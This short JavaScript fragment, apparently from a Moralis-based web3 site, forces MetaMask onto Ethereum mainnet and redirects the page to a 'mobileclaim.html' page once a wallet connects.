...
Moralis.onWeb3Enabled(async (data) => {
    if (data.chainId !== 1 && metamaskInstalled) await Moralis.switchNetwork("0x1");    // mainnet
    //if (data.chainId !== 3 && metamaskInstalled) await Moralis.switchNetwork("0x3"); // @Ropsten Testing
    updateState(true);
    console.log(data);
});
Moralis.onChainChanged(async (chain) => (chain !== "0x1" && metamaskInstalled) ? await Moralis.switchNetwork("0x1") : null);    // mainnet
//Moralis.onChainChanged(async (chain) => (chain !== "0x3" && metamaskInstalled) ? await Moralis.switchNetwork("0x3") : null); // @Ropsten Testing
...
async function updateState(connected) {
    if (connected) Object.assign(document.createElement('a'), { href: "./mobileclaim.html", }).click();
}
